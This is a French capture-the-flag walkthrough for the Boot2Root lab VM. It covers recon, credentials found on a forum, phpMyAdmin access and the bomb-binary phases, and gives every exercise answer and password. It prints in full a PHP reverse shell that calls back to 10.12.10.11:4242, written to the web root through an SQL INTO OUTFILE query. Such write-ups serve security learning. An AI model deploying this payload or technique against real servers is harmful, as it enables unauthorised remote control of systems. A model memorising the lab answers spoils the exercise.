@@ -1,0 +1,76 @@
+
+1. Démarrer la VM avec l'iso Boot2Root.
+2. Ouvrir un terminal et lancer la commande ifconfig, on récupère l'IP de la Vm grâce à cela (vmnet8).
+3. On lance nmap sur l'IP de la machine avec un padding de 255. Cela nous permet de voir les ports ouverts sur le VM et de récupérer son adresse https.
+
+
+
+
+1# Exploitation de l'iso.
+
+
+
+ 1.1 Connection via SSH
+
+	Grâce à nmap on a découvert que le port 22 est utilisé pour la connection ssh, on voit aussi que plusieurs paths sont accessibles via le navigateur.
+
+	On va donc essayer de les exploiters.
+
+	Le premier path est https://<ip>/forum, il y à plusieurs topic de créer en les parcourants on trouve un login : lmezard et un mot de passe : !q\]Ej?*5K5cy*AJ. On essaye donc de ce log sur le forum avec ce couple de login/passwd. Grâce à cela on récupère l'adresse mail lié au compte lmezard -> laurie@borntosec.net.
+
+	Mainteant que nous avons ces informations, nous allons nous intéresser au second path accessible via le navigateur : webmail, ce path nous permet d'accéder à une boite mail online SquirelMail. Une page de login est display en y entrant les informations précedement récupérer on résussi a ce login.
+
+	Sur cette boîte mail on découvre plusieurs mails dont un nous donnant le couple login/password pour accéder a PHPMYADMIN. login : root passwd : Fg-'kKXBj87E:aJ$.
+
+	Maintenant que nous avons accès en root à PHPMYADMIN nous allons tenter d'insérer du code malveillant sur le server via des requêtes SQL : 
+
+	select "<?php set_time_limit (0);$VERSION = '1.0';$ip = '10.12.10.11';$port = 4242;$chunk_size = 1400;$write_a = null;$error_a = null;$shell = 'uname -a; w; id; /bin/sh -i';$daemon = 0;$debug = 0;if (function_exists('pcntl_fork')) {$pid = pcntl_fork();if ($pid == -1) {printit('ERROR: Cant fork');exit(1);}if ($pid) {exit(0);}if (posix_setsid() == -1) {printit('Error: Cant setsid()');exit(1);}$daemon = 1;} else {printit('WARNING: Failed to daemonise.  This is quite common and not fatal.');}chdir('/');umask(0);$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) {printit('$errstr ($errno)');exit(1);}$descriptorspec = array(   0 => array('pipe', 'r'),   1 => array('pipe', 'w'),   2 => array('pipe', 'w'));$process = proc_open($shell, $descriptorspec, $pipes);if (!is_resource($process)) {printit('ERROR: Cant spawn shell');exit(1);}stream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit('Successfully opened reverse shell to $ip:$port');while (1) {if (feof($sock)) {printit('ERROR: Shell connection terminated');break;}if (feof($pipes[1])) {printit('ERROR: Shell process terminated');break;}$read_a = array($sock, $pipes[1], $pipes[2]);$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);if (in_array($sock, $read_a)) {if ($debug) printit('SOCK READ');$input = fread($sock, $chunk_size);if ($debug) printit('SOCK: $input');fwrite($pipes[0], $input);}if (in_array($pipes[1], $read_a)) {if ($debug) printit('STDOUT READ');$input = fread($pipes[1], $chunk_size);if ($debug) printit('STDOUT: $input');fwrite($sock, $input);}if (in_array($pipes[2], $read_a)) {if ($debug) printit('STDERR READ');$input = fread($pipes[2], $chunk_size);if ($debug) printit('STDERR: $input');fwrite($sock, $input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit ($string) {if (!$daemon) {print '$string\n';}}?>" into outfile "/var/www/forum/templates_c/reverse_shell.php"
+
+	c'est une shellcode php permettant d'ouvrir un shell quand celui-ci est executé. On a découvert précedement un path /forun/templates_c c'est donc ici que l'on devra créer notre shellcode.php pour pouvoir ensuite le call depuis le navigateur internet et récupérer la main dessuis grâce à nc -v -n -l 4242
+
+	Nous avon donc un stream d'ouvert sur la VM, dans /home/LOOKATME/passwd nous trouvons un couple mot de passe / login qui va nous permettre de nous connecter sur la VM.
+
+	Une fois connecter un fichier README nous attends ainsi qu'un fichier fun qui s'avère être une archive, nous avons donc scp cette archine sur un serveur privé puis sur les mahines de 42 pour pouvoir l'exploiter.
+
+	Une fois cela fait nous avons tar l'archive, nous récupérons une sorte de main ainsi qu'une centaine de .pcaps
+	En exploitant le main on voit que le mot de passe est print via des getmes, et que l'on attends de nous qu'une fois le mot de passe toruvé on l'encrypt en SHA-256 pour pouvoir ensuite ce connecter via SSH. On obtient le password : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4 
+
+
+
+ 1.2 Exploitation des binaires du serveur pour devenir root
+
+
+	Le prmeier challenge  ce nomme Bomb, c'est une série d'étape pour devenir diffuser une bomb, nous allons donc utiliser gdb sur ce binnaire pour voir ce qu'il nous demande comme réponse. Un e README est à notre disposition avec des Hints ayant pour but de nous aider dans la résolution de l'exercice on voit qu'il y autant de ligne que de phase de diffusion. Donc une aide pour chaque phase.
+
+	a. La première phase_1  est marquer en brut dans le code il compare notre input à une string en dur via une function str_not_equal.
+	answer : Public speaking is very easy.
+
+	b. Le seconde phase_2 nous demandes d'enter 6 nombres puis les compares pour vérifier si ce sont les bons. Une fois les premier chiffre ilest facile de reconnaître le schéma.
+	answer : 1 2 6 24 120 720
+
+	c. Le readme nous indiques que le second argument est un b. On utilie gdb pour retrouver les deux autres.
+
+	d. En utilisant gdb on voit que la bombe attends un chiffre entre 7 et 10.
+	answer : 9
+
+	e. En regardant l'asm nous voyant que comme dans la premiere phase notre input après une succession d'opèration est comparé a giants, l'hint du readme nous dit que la premiere lettre sera un o.
+	On va donc essayer de reconnaitre le pattern employé pour que notre string après transformation deviennent giants, on reconnait une methode de substitution, en étudiant la transformation de chaque lettre d el'alphabet il est nous est donc possible de trouver la bonne phrase : opekmq durant l'étude des substitutions nous avons vue que le s de giants pouvait être un a ou un q, cela n'est pas très utile pour le moment mais nous y reviendrons plus tard.
+	answer : opekma ou opekmaq
+
+	f. Comme pour la phase b il y a une fonction six_numbers qui vérifie que l'input que nous avons rentrer comporte bien 6 nombres, le hint du readme nous indique que le preier nombre est 4. En décompilant le binaire on voit que nos nombres sont comparé a des valeurs bruts. Malgré plusieurs tentatives nous ne trouvions pas la solutions, nous avons découvert 6 nodes, autant que de nombres demandé =, on remarque aussi que la node 4 possède la plus faible valeur nous allons donc essayer de les marqué dans l'ordre.
+	answe : 4 2 6 3 1 5
+
+	Pour finir ce challenge nous devions concaténner nos réponses précedemment trouvé pour obtenir le mot de passe du user Thor.
+
+	Ca ne marchais pas nous avons donc essayer les deux syntax de la réponse e toujours rien, nous avons donc fait un tour sur le forum de 42 et nous avons trouvés un sujet concernant ce problème, cela vient d'une erreur dans le sujet de boot2root nous devons inverser nos deux dernier caractères.
+	answer : Publicspeakingisveryeasy.126241207201b2149opekmq426135
+
+
+
+
+
+
+
+
+
+
